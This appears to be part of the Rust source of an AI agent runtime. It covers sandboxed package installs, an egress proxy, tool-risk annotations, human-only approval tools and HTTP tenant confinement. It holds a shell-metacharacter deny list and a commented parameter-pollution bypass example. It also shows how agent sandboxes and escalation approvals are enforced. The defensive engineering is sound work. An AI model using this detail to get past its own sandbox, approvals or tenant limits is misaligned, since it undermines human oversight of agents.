    spec.chars().all(|c| {
        c.is_ascii()
            && !c.is_control()
            && !c.is_whitespace()
            && !matches!(
                c,
                ';' | '|' | '&' | '$' | '`' | '(' | ')' | '{' | '}' | '<' | '>' | '\\' | '\'' | '"' | '?' | '#'
            )
    })
}

fn hash_pkg_manifests(target_dir: &Path) -> anyhow::Result<std::collections::BTreeMap<String, String>> {
    let mut hashes = std::collections::BTreeMap::new();
    for name in PKG_MANIFEST_FILES {
        let p = target_dir.join(name);
        match std::fs::symlink_metadata(&p) {
            Ok(meta) if meta.file_type().is_symlink() => {
                bail!(
                    "Refusing package operation: manifest '{}' is a symlink",
                    p.display()
                );
            }
            Ok(meta) if meta.is_file() => {
                let bytes = std::fs::read(&p)?;
                hashes.insert((*name).to_string(), format!("sha256:{}", hex::encode(Sha256::digest(&bytes))));
            }
            Ok(_) => {
                hashes.insert((*name).to_string(), "NON_FILE".to_string());
            }
            Err(_) => {
                hashes.insert((*name).to_string(), "ABSENT".to_string());
            }
        }
    }
    Ok(hashes)
}

async fn execute_pkg_install(
    identity: &AgentIdentity,
    plan: PkgInstallPlan,
) -> anyhow::Result<Value> {
    let current_hashes = hash_pkg_manifests(&plan.target_dir)?;
    if current_hashes != plan.pre_manifest_hashes {
        bail!(
            "TOCTOU integrity error: package manifest/lockfile state in '{}' changed after approval",
            plan.cwd_rel
        );
    }

    let cache_root = plan.agent_home_dir.join("deps/cache");
    tokio::fs::create_dir_all(&cache_root).await?;

    let mut env = HashMap::new();
    let (cmd, cmd_args): (String, Vec<String>) = match plan.manager.as_str() {
        "npm" | "pnpm" | "yarn" | "bun" => {
            CoWWorkspace::isolate_shadow_dependency_dir(
                &plan.host_root,
                &plan.shadow_root,
                &plan.target_dir,
                "node_modules",
            )?;
            if plan.target_dir != plan.shadow_root {
                CoWWorkspace::isolate_shadow_dependency_dir(
                    &plan.host_root,
                    &plan.shadow_root,
                    &plan.shadow_root,
                    "node_modules",
                )?;
            }
            let mgr_cache = cache_root.join(&plan.manager);
            tokio::fs::create_dir_all(&mgr_cache).await?;
            let cache_str = mgr_cache.display().to_string();
            env.insert("NPM_CONFIG_USERCONFIG".to_string(), "/dev/null".to_string());
            env.insert("NPM_CONFIG_CACHE".to_string(), cache_str.clone());
            env.insert("npm_config_cache".to_string(), cache_str);
            env.insert(
                "npm_config_registry".to_string(),
                "https://registry.npmjs.org/".to_string(),
            );
            env.insert("COREPACK_ENABLE_STRICT".to_string(), "0".to_string());
            env.insert("CI".to_string(), "true".to_string());
            if !plan.allow_scripts {
                env.insert("YARN_ENABLE_SCRIPTS".to_string(), "false".to_string());
            }

            let mut mgr_args: Vec<String> = match plan.manager.as_str() {
                "npm" => {
                    let mut a = vec![
                        "install".to_string(),
                        "--no-audit".to_string(),
                        "--no-fund".to_string(),
                    ];
                    if plan.dev && !plan.packages.is_empty() {
                        a.push("--save-dev".to_string());
                    }
                    a
                }
                _ => {
                    if plan.packages.is_empty() {
                        vec!["install".to_string()]
                    } else {
                        let mut a = vec!["add".to_string()];
                        if plan.dev {
                            a.push("-D".to_string());
                        }
                        a
                    }
                }
            };
            if !plan.allow_scripts {
                mgr_args.push("--ignore-scripts".to_string());
            }
            if plan.offline {
                mgr_args.push("--offline".to_string());
            }
            mgr_args.extend(plan.packages.iter().cloned());

            let mut sh_args = vec![
                "-c".to_string(),
                r#"cmd="$1"; shift; exec "$cmd" "$@""#.to_string(),
                "aegis-pkg".to_string(),
                plan.manager.clone(),
            ];
            sh_args.extend(mgr_args);
            ("sh".to_string(), sh_args)
        }
        "pip" | "uv" => {
            CoWWorkspace::isolate_shadow_dependency_dir(
                &plan.host_root,
                &plan.shadow_root,
                &plan.target_dir,
                ".venv",
            )?;
            let mgr_cache = cache_root.join(&plan.manager);
            tokio::fs::create_dir_all(&mgr_cache).await?;
            let cache_str = mgr_cache.display().to_string();
            env.insert("PIP_CONFIG_FILE".to_string(), "/dev/null".to_string());
            env.insert("PIP_CACHE_DIR".to_string(), cache_str.clone());
            env.insert("UV_CACHE_DIR".to_string(), cache_str);
            env.insert("UV_NO_CONFIG".to_string(), "1".to_string());
            env.insert(
                "PIP_INDEX_URL".to_string(),
                "https://pypi.org/simple".to_string(),
            );
            env.insert(
                "UV_INDEX_URL".to_string(),
                "https://pypi.org/simple".to_string(),
            );

            let mut py_args = Vec::new();
            let script = if plan.manager == "pip" {
                if plan.offline {
                    py_args.push("--no-index".to_string());
                }
                if !plan.allow_scripts {
                    py_args.push("--only-binary=:all:".to_string());
                }
                if plan.packages.is_empty() {
                    if plan.target_dir.join("requirements.txt").is_file() {
                        py_args.extend(["-r".to_string(), "requirements.txt".to_string()]);
                    } else {
                        py_args.push(".".to_string());
                    }
                } else {
                    py_args.extend(plan.packages.iter().cloned());
                }
                "if [ ! -x .venv/bin/python ]; then python3 -m venv .venv; fi; exec .venv/bin/pip install \"$@\""
            } else {
                if plan.offline {
                    py_args.push("--offline".to_string());
                }
                if plan.packages.is_empty() {
                    if plan.target_dir.join("requirements.txt").is_file() {
                        py_args.extend([
                            "--python".to_string(),
                            ".venv/bin/python".to_string(),
                            "-r".to_string(),
                            "requirements.txt".to_string(),
                        ]);
                        "if [ ! -x .venv/bin/python ]; then uv venv .venv; fi; exec uv pip install \"$@\""
                    } else {
                        "if [ ! -x .venv/bin/python ]; then uv venv .venv; fi; exec uv sync \"$@\""
                    }
                } else {
                    py_args.extend(["--python".to_string(), ".venv/bin/python".to_string()]);
                    py_args.extend(plan.packages.iter().cloned());
                    "if [ ! -x .venv/bin/python ]; then uv venv .venv; fi; exec uv pip install \"$@\""
                }
            };
            let mut sh_args = vec!["-c".to_string(), script.to_string(), "aegis-pkg".to_string()];
            sh_args.extend(py_args);
            ("sh".to_string(), sh_args)
        }
        "cargo" => {
            let cargo_home = plan.agent_home_dir.join("deps/cargo_home");
            tokio::fs::create_dir_all(cargo_home.join("registry")).await?;
            tokio::fs::create_dir_all(cargo_home.join("git")).await?;
            env.insert("CARGO_HOME".to_string(), cargo_home.display().to_string());
            env.insert("CARGO_NET_GIT_FETCH_WITH_CLI".to_string(), "false".to_string());

            let mut sh_args = Vec::new();
            let script = if plan.packages.is_empty() {
                if plan.offline {
                    sh_args.push("--offline".to_string());
                }
                r#"exec cargo fetch "$@""#
            } else {
                if plan.dev {
                    sh_args.push("--dev".to_string());
                }
                if plan.offline {
                    sh_args.push("--offline".to_string());
                }
                sh_args.extend(plan.packages.iter().cloned());
                if plan.offline {
                    r#"cargo add "$@" && cargo fetch --offline"#
                } else {
                    r#"cargo add "$@" && cargo fetch"#
                }
            };
            let mut full_args = vec!["-c".to_string(), script.to_string(), "aegis-pkg".to_string()];
            full_args.extend(sh_args);
            ("sh".to_string(), full_args)
        }
        "go" => {
            let go_path = plan.agent_home_dir.join("deps/go_path");
            let go_mod_cache = go_path.join("pkg/mod");
            let go_cache = cache_root.join("go-build");
            tokio::fs::create_dir_all(&go_mod_cache).await?;
            tokio::fs::create_dir_all(&go_cache).await?;
            env.insert("GOPATH".to_string(), go_path.display().to_string());
            env.insert("GOMODCACHE".to_string(), go_mod_cache.display().to_string());
            env.insert("GOCACHE".to_string(), go_cache.display().to_string());
            env.insert("GOTOOLCHAIN".to_string(), "local".to_string());
            env.insert(
                "GOPROXY".to_string(),
                if plan.offline {
                    "off".to_string()
                } else {
                    "https://proxy.golang.org,direct".to_string()
                },
            );
            env.insert(
                "GOSUMDB".to_string(),
                if plan.offline {
                    "off".to_string()
                } else {
                    "sum.golang.org".to_string()
                },
            );

            let mut go_args = Vec::new();
            if plan.packages.is_empty() {
                go_args.push("mod".to_string());
                go_args.push("download".to_string());
            } else {
                go_args.push("get".to_string());
                go_args.extend(plan.packages.iter().cloned());
            }
            let mut sh_args = vec![
                "-c".to_string(),
                r#"cmd="$1"; shift; exec "$cmd" "$@""#.to_string(),
                "aegis-pkg".to_string(),
                "go".to_string(),
            ];
            sh_args.extend(go_args);
            ("sh".to_string(), sh_args)
        }
        other => bail!("Unsupported package manager '{}'", other),
    };

    let (_proxy_guard, egress_proxy_addr) = if !plan.offline {
        let egress = Arc::new(AegisEgressGateway::new());
        egress
            .allow_domains(&identity.org_id, plan.registry_domains.clone())
            .await;
        let (addr, handle) = egress
            .start_local_proxy_abortable("127.0.0.1:0", Some(identity.clone()))
            .await?;
        (
            Some(ProxyAbortGuard(Some(handle))),
            Some(format!("http://{}", addr)),
        )
    } else {
        (None, None)
    };

    let sbx = NativeOsSandboxDriver
        .create_sandbox(SandboxConfig {
            identity: identity.clone(),
            tier: IsolationTier::NativeOsSandbox,
            limits: ResourceLimits::default(),
            workspace_dir: plan.shadow_root.clone(),
            agent_home_dir: plan.agent_home_dir.clone(),
            org_shared_ro_dir: plan.org_shared_ro_dir.clone(),
            org_agent_pub_dir: plan.org_agent_pub_dir.clone(),
            egress_proxy_addr,
            host_source_dir: Some(plan.host_root.clone()),
            tighten_home_read: true,
            allowed_loopback_ports: Vec::new(),
            isolate_loopback_only: true,
        })
        .await?;

    let out = sbx
        .exec(ExecSpec {
            command: cmd,
            args: cmd_args,
            cwd: Some(plan.target_dir.clone()),
            env,
            timeout_ms: Some(plan.timeout_ms),
            background: false,
        })
        .await?;

    let post_hashes = hash_pkg_manifests(&plan.target_dir).unwrap_or_default();
    let changed_manifests: Vec<String> = post_hashes
        .iter()
        .filter_map(|(k, v)| {
            if plan.pre_manifest_hashes.get(k) != Some(v) {
                Some(k.clone())
            } else {
                None
            }
        })
        .collect();
    let (stdout_redacted, _) = redact_dlp_secrets(&out.stdout);
    let (stderr_redacted, _) = redact_dlp_secrets(&out.stderr);
    let succeeded = out.exit_code == Some(0);

    Ok(json!({
        "status": if succeeded { "pkg_installed" } else { "pkg_install_failed" },
        "manager": plan.manager,
        "cwd": plan.cwd_rel,
        "packages": plan.packages,
        "exit_code": out.exit_code,
        "duration_ms": out.duration_ms,
        "sandbox_profile_used": out.sandbox_profile_used,
        "registry_domains": if plan.offline { Vec::<String>::new() } else { plan.registry_domains },
        "allow_scripts": plan.allow_scripts,
        "offline": plan.offline,
        "changed_manifests": changed_manifests,
        "host_modified": false,
        "stdout": stdout_redacted,
        "stderr": stderr_redacted,
        "evidence_hash": plan.evidence_hash,
    }))
}

/// Tools that mint leases. They stay callable in-process (CLI `aegis-os policy approve`, dashboard,
/// benches) but are never exposed to agents over MCP: an agent must not approve its own escalation.
pub const HUMAN_ONLY_TOOLS: &[&str] = &["policy_approve_escalation", "policy_grant_lease"];

/// MCP tool annotations, `(name, readOnlyHint, destructiveHint, idempotentHint, openWorldHint)`,
/// declared on every tool so hosts can decide what to confirm. "Read-only" means the call leaves the
/// shadow workspace, host repo and shared Org state untouched; "open world" means it can reach
/// systems outside the runtime. Keep in step with each handler when its behaviour changes.
pub const TOOL_ANNOTATIONS: &[(&str, bool, bool, bool, bool)] = &[
    ("fs_read", true, false, true, false),
    ("fs_write", false, true, true, false),
    ("fs_edit", false, true, false, false),
    ("fs_delete", false, true, true, false),
    ("fs_glob", true, false, true, false),
    ("fs_export_file", false, true, true, false),
    ("fs_import_file", false, false, true, false),
    // Auto-rebases the shadow onto the host before reporting.
    ("workspace_status", false, false, true, false),
    ("workspace_sync", false, false, true, false),
    ("workspace_snapshot", false, false, false, false),
    ("workspace_diff", false, false, true, false),
    ("workspace_rollback", false, true, true, false),
    ("workspace_commit", false, true, false, false),
    ("workspace_export_pr", false, false, false, false),
    ("workspace_switch", false, false, true, false),
    ("workspace_git_inspect", true, false, true, false),
    ("workspace_git", false, true, false, true),
    ("github_ci_inspect", true, false, true, true),
    ("github_ci_rerun", false, false, false, true),
    ("github_pr_inspect", true, false, true, true),
    ("github_issue_inspect", true, false, true, true),
    ("github_pr_create", false, false, false, true),
    ("github_comment_create", false, false, false, true),
    ("github_pr_merge", false, true, false, true),
    // Arbitrary sandboxed commands; network policy depends on the sandbox profile.
    ("proc_exec", false, true, false, true),
    ("pkg_install", false, false, false, true),
    ("org_artifact_publish", false, false, true, false),
    ("org_artifact_fetch", true, false, true, false),
    ("org_kv_put", false, false, false, false),
    ("org_kv_get", true, false, true, false),
    ("ipc_list_peers", true, false, true, false),
    ("ipc_update_card", false, false, true, false),
    ("ipc_task_update", false, false, false, false),
    ("ipc_task_get", true, false, true, false),
    ("ipc_task_list", true, false, true, false),
    ("ipc_send", false, false, false, false),
    ("ipc_request", false, false, false, false),
    ("ipc_reply", false, false, false, false),
    ("ipc_recv", true, false, true, false),
    ("ipc_publish", false, false, false, false),
    ("ipc_subscribe", false, false, true, false),
    ("ipc_ack", false, false, true, false),
    ("ipc_wait", false, false, true, false),
    // Inspects and rewrites the request at the boundary; it does not forward it (yet).
    ("egress_http_request", true, false, true, false),
    ("coord_claim", false, false, true, false),
    ("coord_release", false, false, true, false),
    ("policy_list_escalations", true, false, true, false),
    ("memory_policy_evaluate", true, false, true, false),
    ("runtime_configure_mode", false, false, true, true),
    ("app_catalog_search", true, false, true, false),
    ("app_mount_session", false, false, true, true),
    ("app_call_tool", false, true, false, true),
];

/// Upper bound for leases minted through `call_tool`; never permanent (`ttl <= 0` used to mean
/// "never expires"). The CLI's `aegis-os policy approve` calls the policy kernel directly.
const MAX_TOOL_LEASE_TTL_SECS: i64 = 24 * 3600;

/// Whether the HTTP daemon authenticates callers.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DaemonAuth {
    /// Default. Non-public routes need the operator token or a tenant API key; keys are confined
    /// to their own org; approvals and cross-org views are operator-only.
    Required,
    /// No authentication; identity comes from `X-Aegis-*` headers. Local debugging only
    /// (`aegis-os daemon --insecure-no-auth`).
    Disabled,
}

fn route_path(target: &str) -> &str {
    target.split('?').next().unwrap_or(target)
}

/// Routes anonymous callers may use: static pages, discovery, installers, and the billing flow,
/// which authenticates with its own credentials (webhook HMAC, claim token, first-key signup).
fn is_public_route(method: &str, target: &str) -> bool {
    let path = route_path(target);
    let get_public = path == "/"
        || path == "/approve"
        || [
            "/dashboard",
            "/ui",
            "/install.sh",
            "/health",
            "/.well-known/",
            "/releases/",
            "/v1/billing/status",
            "/v1/status",
            "/api/status",
            "/v1/approver",
            "/v1/approvals/diff",
        ]
        .iter()
        .any(|p| path.starts_with(p));
    // `/approver/enroll` authenticates with the one-time token from the mailed link.
    let any_public = [
        "/v1/billing/checkout",
        "/v1/billing/webhook",
        "/v1/billing/claim",
        "/v1/telemetry/ping",
        "/approver/enroll",
        "/v1/approver/email",
        "/v1/approvals/decide",
        "/v1/leases/revoke",
    ]
    .iter()
    .any(|p| path.starts_with(p));
    // Key signup: the route itself only lets anonymous callers mint an org's *first* key.
    let signup = method == "POST" && path.starts_with("/v1/tenants/keys");
    (method == "GET" && get_public) || any_public || signup
}

/// Routes no tenant key may use: simulating approvals, resetting approvers, fleet-wide GC, and
/// cross-org status views. (`/v1/approvals/decide` takes a tenant key only together with the
/// approver's TOTP code, checked in the handler: agents hold tenant keys but not the code.)
fn is_operator_only_route(method: &str, target: &str) -> bool {
    let path = route_path(target);
    (path.starts_with("/v1/approvals/")
        && !path.starts_with("/v1/approvals/decide")
        && !path.starts_with("/v1/approvals/diff"))
        || (method == "DELETE" && path.starts_with("/v1/approver"))
        || path.starts_with("/v1/orgs")
        || path.starts_with("/v1/workspaces/gc-idle")
        || path.starts_with("/v1/telemetry/stats")
        || ((path.starts_with("/api/status") || path.starts_with("/v1/status"))
            && requested_orgs(target, "").iter().any(|o| o == "*"))
}

/// Every `org_id` a request asks to act on, from all `org_id` query parameters and the JSON body
/// `org_id` field. Returning all values prevents HTTP Parameter Pollution (`?org_id=own&org_id=victim`)
/// and query-vs-body discrepancies from bypassing tenant org confinement.
fn requested_orgs(target: &str, body: &str) -> Vec<String> {
    let mut out = Vec::new();
    if let Some((_, qs)) = target.split_once('?') {
        for pair in qs.split('&') {
            if let Some(("org_id", v)) = pair.split_once('=') {
                let decoded = v.trim().replace("%2A", "*").replace("%2a", "*");
                if !decoded.is_empty() {
                    out.push(decoded);
                }
            }
        }
    }
    if let Ok(v) = serde_json::from_str::<Value>(body.trim()) {
        if let Some(o) = v.get("org_id").and_then(|o| o.as_str()).map(str::trim) {
            if !o.is_empty() {
                out.push(o.to_string());
            }
        }
    }
    out
}

/// The primary org a request asks to act on, from the `org_id` query parameter or JSON body field.
fn requested_org(target: &str, body: &str) -> Option<String> {
    requested_orgs(target, body).into_iter().next()
}

/// HTTP daemon limits: the declared body size is trusted only up to this bound, and the whole
/// request (head + body) must arrive within the timeout.
const MAX_HTTP_BODY_BYTES: usize = 64 * 1024 * 1024;
const HTTP_REQUEST_READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);

pub struct AgentEnvironment {
    pub identity: AgentIdentity,
    pub workspace: Arc<dyn TransactionalWorkspace>,
    pub sandbox: Box<dyn SandboxInstance>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MountedMcpServer {
    pub name: String,
    pub endpoint: String,
    pub scope: String,
    pub mounted_by: String,
}

pub struct AegisRuntimeKernel {
    runtime_data_root: PathBuf,
    pub policy: Arc<dyn PolicyEngine>,
    pub ipc: Arc<dyn IpcBus>,
    pub org_storage: Arc<dyn OrgSharedStorage>,
    pub egress: Arc<AegisEgressGateway>,
    pub recorder: Arc<dyn FlightRecorder>,
    pub paas: Arc<PaasControlPlane>,
    pub app_store: Arc<AppStoreRegistry>,
    pub vault: Arc<OrgVaultManager>,
    memory_url: Option<String>,
    memory_bridge_token: Option<String>,
    memory_task_secret: Option<String>,
    agents: Arc<RwLock<HashMap<String, Arc<AgentEnvironment>>>>,
    mounted_mcp_servers: Arc<RwLock<Vec<MountedMcpServer>>>,
}

impl AegisRuntimeKernel {
    pub async fn new(runtime_data_root: impl AsRef<Path>) -> anyhow::Result<Self> {
        let raw_root = runtime_data_root.as_ref().to_path_buf();
        tokio::fs::create_dir_all(&raw_root).await?;
        let root = std::fs::canonicalize(&raw_root).unwrap_or(raw_root);
        let vault = Arc::new(OrgVaultManager::new(&root));
        Self::new_with_vault(&root, vault).await
    }

    pub async fn new_with_vault(
        runtime_data_root: impl AsRef<Path>,
        vault: Arc<OrgVaultManager>,
    ) -> anyhow::Result<Self> {
        let raw_root = runtime_data_root.as_ref().to_path_buf();
        tokio::fs::create_dir_all(&raw_root).await?;
        let root = std::fs::canonicalize(&raw_root).unwrap_or(raw_root);

        let policy = Arc::new(AegisPolicyKernel::with_state_file(Some(
            root.join("policy_state.json"),
        )));
        let ipc = Arc::new(AegisIpcBus::with_state_file(Some(
            root.join("ipc_state.json"),
        )));
        let org_storage = Arc::new(OrgCasAndKvStore::new(root.join("orgs")).await?);
        let audit_path = root.join("audit").join("flight_recorder.jsonl");
        let recorder = Arc::new(AegisFlightRecorder::new(Some(audit_path)));
        let paas = Arc::new(PaasControlPlane::new(&root));
        let app_store = Arc::new(AppStoreRegistry::new(&root));

        Ok(Self {
            runtime_data_root: root,
            policy,
            ipc,
            org_storage,
            egress: Arc::new(AegisEgressGateway::new()),
            recorder,
            paas,
            app_store,
            vault,
            memory_url: std::env::var("AOS_MEMORY_URL")
                .ok()
                .filter(|value| !value.is_empty()),
            memory_bridge_token: std::env::var("AOS_MEMORY_BRIDGE_TOKEN")
                .ok()
                .filter(|value| !value.is_empty()),
            memory_task_secret: std::env::var("AOS_MEMORY_TASK_SECRET")
                .ok()
                .filter(|value| !value.is_empty()),
            agents: Arc::new(RwLock::new(HashMap::new())),
            mounted_mcp_servers: Arc::new(RwLock::new(Vec::new())),
        })
    }

    pub async fn ensure_org_vault(&self, org_id: &str) -> anyhow::Result<VaultStatus> {
        let vault = self.vault.clone();
        let org = org_id.to_string();
        tokio::task::spawn_blocking(move || vault.ensure_org_unlocked(&org)).await?
    }

    async fn is_agent_live(
        &self,
        org_id: &str,
        agent_id: &str,
        peers: &[aos_core::PeerInfo],
    ) -> bool {
        if let Some(peer) = peers.iter().find(|p| p.agent_id == agent_id) {
            if let Some(pid) = peer.pid {
                return aos_core::session::is_pid_alive(pid, peer.start_time);
            }
            if peer.online {
                return true;
            }
        }
        self.agents
            .read()
            .await
            .contains_key(&Self::agent_key(org_id, agent_id))
    }

    pub async fn detect_orphaned_shadows(
        &self,
        identity: &AgentIdentity,
        host_source_root: &Path,
    ) -> Vec<Value> {
        let agents_dir = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("agents");
        let Ok(mut rd) = tokio::fs::read_dir(&agents_dir).await else {
            return Vec::new();
        };
        let peers = self.ipc.list_peers(&identity.org_id).await.unwrap_or_default();
        let mut orphaned = Vec::new();
        while let Ok(Some(entry)) = rd.next_entry().await {
            let other_id = entry.file_name().to_string_lossy().to_string();
            if other_id == identity.agent_id || other_id.starts_with('.') {
                continue;
            }
            if self.is_agent_live(&identity.org_id, &other_id, &peers).await {
                continue;
            }
            let cow_base = entry.path().join("cow_workspace");
            let orphan_upper = cow_base.join("upper_workspace");
            if !orphan_upper.is_dir() {
                continue;
            }
            let Ok(diffs) = CoWWorkspace::diff_dirs(host_source_root, &orphan_upper, None).await
            else {
                continue;
            };
            if diffs.is_empty() {
                continue;
            }
            let snapshots_count = tokio::fs::read(cow_base.join("snapshots.json"))
                .await
                .ok()
                .and_then(|b| serde_json::from_slice::<Vec<SnapshotMeta>>(&b).ok())
                .map(|s| s.len())
                .unwrap_or(0);
            let changed_paths: Vec<String> = diffs.iter().map(|d| d.relative_path.clone()).collect();
            orphaned.push(json!({
                "agent_id": other_id,
                "uncommitted_changes_count": diffs.len(),
                "changed_paths": changed_paths,
                "snapshots_count": snapshots_count,
            }));
        }
        orphaned
    }

    pub async fn recover_orphaned_agent_shadow(
        &self,
        identity: &AgentIdentity,
        from_agent_id: &str,
    ) -> anyhow::Result<Value> {
        if from_agent_id.is_empty()
            || from_agent_id == "."
            || from_agent_id == ".."
            || from_agent_id.contains('/')
            || from_agent_id.contains('\\')
            || from_agent_id.contains("..")
            || from_agent_id.contains('*')
        {
            bail!("Invalid orphaned agent id '{}'", from_agent_id);
        }
        if from_agent_id == identity.agent_id {
            bail!("Cannot adopt shadow workspace from self ('{}')", from_agent_id);
        }
        self.ensure_org_vault(&identity.org_id).await?;
        let env = self.get_agent_environment(identity).await?;
        let peers = self.ipc.list_peers(&identity.org_id).await.unwrap_or_default();
        if self
            .is_agent_live(&identity.org_id, from_agent_id, &peers)
            .await
        {
            bail!(
                "Agent '{}' is still alive; cannot adopt an active shadow workspace",
                from_agent_id
            );
        }
        let orphan_upper = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("agents")
            .join(from_agent_id)
            .join("cow_workspace")
            .join("upper_workspace");
        if !orphan_upper.is_dir() {
            bail!(
                "Orphaned shadow workspace for agent '{}' not found",
                from_agent_id
            );
        }

        let diffs =
            CoWWorkspace::diff_dirs(env.workspace.host_source_root(), &orphan_upper, None).await?;
        let pre_snap = env.workspace.create_snapshot("pre-orphan-recovery").await?;
        let mut recovered_paths = Vec::new();
        for entry in diffs {
            let (clean, dst_path) =
                shadow_path_for_write(env.workspace.shadow_root(), &entry.relative_path)?;
            match entry.change_type {
                DiffChangeType::Added | DiffChangeType::Modified => {
                    let src_path = orphan_upper.join(&clean);
                    let bytes = tokio::fs::read(&src_path).await.with_context(|| {
                        format!("reading orphaned shadow file '{}'", src_path.display())
                    })?;
                    aos_core::session::write_bytes_atomic_synced_async(&dst_path, bytes).await?;
                    recovered_paths.push(clean);
                }
                DiffChangeType::Deleted => {
                    if dst_path.exists() {
                        tokio::fs::remove_file(&dst_path).await?;
                        recovered_paths.push(clean);
                    }
                }
            }
        }

        Ok(json!({
            "status": "recovered_orphaned_shadow",
            "from_agent_id": from_agent_id,
            "pre_recovery_snapshot_id": pre_snap.snapshot_id,
            "recovered_paths_count": recovered_paths.len(),
            "recovered_paths": recovered_paths,
        }))
    }

    /// Attach an already-created workspace/sandbox environment to this kernel. The launcher uses
    /// this so MCP tools operate on the same CoW shadow as the agent's native tools instead of
    /// creating a second shadow under `runtime/orgs/...`.
    pub async fn attach_agent_environment(&self, identity: &AgentIdentity, env: AgentEnvironment) {
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        self.agents.write().await.insert(key, Arc::new(env));
    }

    pub async fn get_agent_environment(
        &self,
        identity: &AgentIdentity,
    ) -> anyhow::Result<Arc<AgentEnvironment>> {
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        self.agents
            .read()
            .await
            .get(&key)
            .cloned()
            .with_context(|| format!("Agent environment '{}' is not initialized", key))
    }

    fn agent_key(org_id: &str, agent_id: &str) -> String {
        format!("{}::{}", org_id, agent_id)
    }

    /// Agent ids whose heartbeat is Active or Idle in `org_id`.
    async fn live_peer_ids(&self, org_id: &str) -> std::collections::HashSet<String> {
        self.ipc
            .list_peers(org_id)
            .await
            .unwrap_or_default()
            .into_iter()
            .filter(|p| p.online)
            .map(|p| p.agent_id)
            .collect()
    }

    /// If the agent has an unambiguous active A2A task where it is the **assignee** (`to_agent`),
    /// treat that task as the trusted task context for task-scoped leases, claims, and child
    /// task delegation (`parent_task_id`).
    async fn active_task_id(&self, identity: &AgentIdentity) -> Option<String> {
        let tasks = self
            .ipc
            .list_tasks(Some(&identity.org_id), Some(&identity.agent_id))
            .await
            .ok()?;
        let active_assigned: Vec<_> = tasks
            .into_iter()
            .filter(|task| {
                task.is_assignee(&identity.org_id, &identity.agent_id)
                    && !task.state.is_terminal()
                    && !task.stale
            })
            .collect();
        if active_assigned.len() == 1 {
            return Some(active_assigned[0].id.clone());
        }
        let working: Vec<_> = active_assigned
            .iter()
            .filter(|task| task.state == A2ATaskState::Working)
            .collect();
        if working.len() == 1 {
            return Some(working[0].id.clone());
        }
        None
    }

    /// Releases any claims bound to the specified `task_ids` and broadcasts a coordination release event.
    async fn release_claims_for_tasks(
        &self,
        identity: &AgentIdentity,
        task_ids: &[String],
    ) -> Vec<String> {
        if task_ids.is_empty() {
            return Vec::new();
        }
        for _attempt in 0..5 {
            let Ok((mut table, version)) = self.load_claims(&identity.org_id).await else {
                return Vec::new();
            };
            let mut released_globs = Vec::new();
            for tid in task_ids {
                let rel = claims::release_claims_for_task(&mut table, tid);
                if !rel.is_empty() {
                    let globs: Vec<String> = rel.into_iter().map(|(g, _)| g).collect();
                    let _ = self.ipc.record_task_claims(tid, &globs, true).await;
                    released_globs.extend(globs);
                }
            }
            if released_globs.is_empty() {
                return Vec::new();
            }
            let Ok(value) = serde_json::to_value(&table) else {
                return Vec::new();
            };
            match self
                .org_storage
                .kv_put(
                    identity,
                    claims::CLAIMS_NAMESPACE,
                    claims::CLAIMS_KEY,
                    value,
                    version,
                )
                .await
            {
                Ok(_) => {
                    self.announce_coordination(
                        identity,
                        format!(
                            "[coord] {} auto-released {} (task completed/canceled)",
                            identity.agent_id,
                            released_globs.join(", ")
                        ),
                        json!({
                            "event": "released",
                            "owner": identity.agent_id,
                            "paths": released_globs,
                            "task_ids": task_ids
                        }),
                    )
                    .await;
                    return released_globs;
                }
                Err(e) if e.to_string().contains("version mismatch") => continue,
                Err(_) => return Vec::new(),
            }
        }
        Vec::new()
    }

    /// Releases claims owned by `identity.agent_id` that cover `committed_paths`.
    pub async fn release_claims_matching_committed_paths(
        &self,
        identity: &AgentIdentity,
        committed_paths: &[String],
    ) -> Vec<String> {
        if committed_paths.is_empty() {
            return Vec::new();
        }
        for _attempt in 0..5 {
            let Ok((mut table, version)) = self.load_claims(&identity.org_id).await else {
                return Vec::new();
            };
            let released =
                claims::release_claims_matching_paths(&mut table, &identity.agent_id, committed_paths);
            if released.is_empty() {
                return Vec::new();
            }
            let Ok(value) = serde_json::to_value(&table) else {
                return Vec::new();
            };
            match self
                .org_storage
                .kv_put(
                    identity,
                    claims::CLAIMS_NAMESPACE,
                    claims::CLAIMS_KEY,
                    value,
                    version,
                )
                .await
            {
                Ok(_) => {
                    if let Some(tid) = self.active_task_id(identity).await {
                        let _ = self.ipc.record_task_claims(&tid, &released, true).await;
                    }
                    self.announce_coordination(
                        identity,
                        format!(
                            "[coord] {} auto-released {} on workspace_commit",
                            identity.agent_id,
                            released.join(", ")
                        ),
                        json!({
                            "event": "released",
                            "owner": identity.agent_id,
                            "paths": released,
                            "committed_paths": committed_paths
                        }),
                    )
                    .await;
                    return released;
                }
                Err(e) if e.to_string().contains("version mismatch") => continue,
                Err(_) => return Vec::new(),
            }
        }
        Vec::new()
    }

    /// Cleans up all resources (`TaskScoped` leases, UOMP memory sessions, and bound file claims)
    /// for a terminal task and any of its subtasks that have also reached a terminal state.
    async fn cleanup_terminal_task(&self, identity: &AgentIdentity, root_task_id: &str) {
        let mut terminal_ids = vec![root_task_id.to_string()];
        if let Ok(subtasks) = self.ipc.list_subtasks(root_task_id).await {
            for sub in subtasks {
                if sub.state.is_terminal() && !terminal_ids.contains(&sub.id) {
                    terminal_ids.push(sub.id);
                }
            }
        }
        for tid in &terminal_ids {
            let _ = self.policy.revoke_leases_for_task(tid).await;
            self.revoke_memory_for_task(tid).await;
        }
        let _ = self.release_claims_for_tasks(identity, &terminal_ids).await;
    }

    /// Best-effort reverse propagation: when an A2A task reaches a terminal state, ask the local
    /// UOMP memory server to revoke sessions bound to that task. Configure with
    /// `AOS_MEMORY_URL` + `AOS_MEMORY_BRIDGE_TOKEN`.
    async fn revoke_memory_for_task(&self, task_id: &str) {
        let Some(url) = self.memory_url.clone() else {
            return;
        };
        let task_token = self.memory_task_secret.as_ref().and_then(|secret| {
            let timestamp = Utc::now().timestamp();
            let mut mac = <Hmac<Sha256> as Mac>::new_from_slice(secret.as_bytes()).ok()?;
            mac.update(format!("{task_id}:{timestamp}").as_bytes());
            Some(format!(
                "{task_id}:{timestamp}:{}",
                hex::encode(mac.finalize().into_bytes())
            ))
        });
